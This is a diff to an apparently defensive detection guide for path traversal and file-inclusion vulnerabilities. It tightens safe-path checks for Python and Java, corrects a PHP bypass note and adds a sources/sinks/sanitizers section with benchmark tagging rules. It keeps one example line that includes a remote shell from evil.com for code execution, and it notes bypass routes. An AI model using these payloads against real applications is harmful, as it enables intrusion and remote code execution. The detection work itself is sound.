@@ -229,7 +229,7 @@ Some vulnerabilities involve both path traversal AND local file inclusion:
 ### Python
 - **VULN**: `open(user_input)`, `open(os.path.join(base, user_input))` — no realpath validation
 - **VULN**: `send_file(user_input)`, `send_from_directory(base, user_input)` — Flask file serving with user-controlled path
-- **SAFE**: `safe_path = os.path.realpath(os.path.join(base, user_input)); assert safe_path.startswith(base)`
+- **SAFE**: `base = os.path.realpath(base); safe_path = os.path.realpath(os.path.join(base, user_input)); assert os.path.commonpath([base, safe_path]) == base`
 - **Pattern**: `../` in `user_input` traverses out of the intended directory
 
 ### JavaScript (Node.js)
@@ -239,7 +239,7 @@ Some vulnerabilities involve both path traversal AND local file inclusion:
 
 ### PHP
 - **VULN**: `include($_GET['page'])`, `require($_GET['file'])` — LFI
-- **VULN**: `include($_GET['page'] . '.php')` — still bypassable via null byte or wrappers
+- **VULN**: `include($_GET['page'] . '.php')` — bypassable via null byte on PHP < 5.3.4 only; still bypassable via wrappers on modern PHP
 - **VULN**: `file_get_contents($_GET['file'])`, `readfile($_GET['path'])`
 - **SAFE**: `include(basename($_GET['page']) . '.php')` — reduces but does not eliminate risk
 - **RFI**: When `allow_url_include=On`, `include('http://evil.com/shell.php')` achieves RCE
@@ -257,8 +257,9 @@ Paths.get(tainted)
 
 **SAFE** — canonical path validated against allowed base:
 ```java
+String canonicalBase = new File(base).getCanonicalPath();
 File f = new File(base, tainted).getCanonicalFile();
-if (!f.getPath().startsWith(base)) throw new Exception();
+if (!f.getPath().startsWith(canonicalBase + File.separator) && !f.getPath().equals(canonicalBase)) throw new Exception();
 ```
 
 **Decision rule**: tainted string in ANY argument of `File()`, `FileInputStream()`, `Paths.get()` with no canonical path check → **VULN**.
@@ -431,3 +432,21 @@ if (!dest.getPath().startsWith(baseDir)) throw new SecurityException();
 - `ClassLoader.getResourceAsStream(userInput)` → **CONFIRM** (classpath file disclosure)
 - In benchmark mode, use project tag `path_traversal` for vulhub representative dirs even when the primitive is local file inclusion or path traversal.
 - FALSE POSITIVE guard: do not keep `path_traversal_lfi_rfi` as the reported tag for `vulhub`.
+
+## Sources, Sinks & Sanitizers
+
+Path traversal is modeled as **taint from remote sources to path-creation / file-access sinks**, with language-specific sanitizers (canonical path + prefix check, filename-only validation).
+
+**Sources**: HTTP parameters, cookies, headers, request bodies (`ActiveThreatModelSource` / `RemoteFlowSource`).
+
+**Sinks**: `fs.readFile`, `path.join` → file open, `sendFile`, Java `new File(…)`, `Paths.get`, Python `open`/`os.path.join`, Go `filepath.Join` + `os.Open`, archive `extract` entry paths.
+
+**Sanitizers (Java `PathInjectionSanitizer`)**: `getCanonicalPath()` + trusted prefix guard; `Path.normalize()` + prefix; rejection of `..` and separators; exact path match guards; Kotlin `FilesKt`/`StringsKt` prefix checks paired with traversal guards.
+
+**Sanitizers (JS `TaintedPath`)**: `path.resolve`/`realpathSync` + root prefix check; `sanitize-filename`; allowlist regex on basename; barrier guards on normalized absolute paths within root.
+
+**SAFE patterns**: `File(base, tainted).getCanonicalFile()` then `startsWith(safeRoot)`; Python `realpath` + prefix; deny absolute paths; validate `ZipEntry.getName()` before extract.
+
+Commonly affected languages: JavaScript, Java, Python, Go, C#, Ruby, Rust, Swift.
+
+**Manual triage**: PHP `include`/`require` LFI (sink is code execution, not path label). RFI via `allow_url_include` is not modeled as a dedicated query.
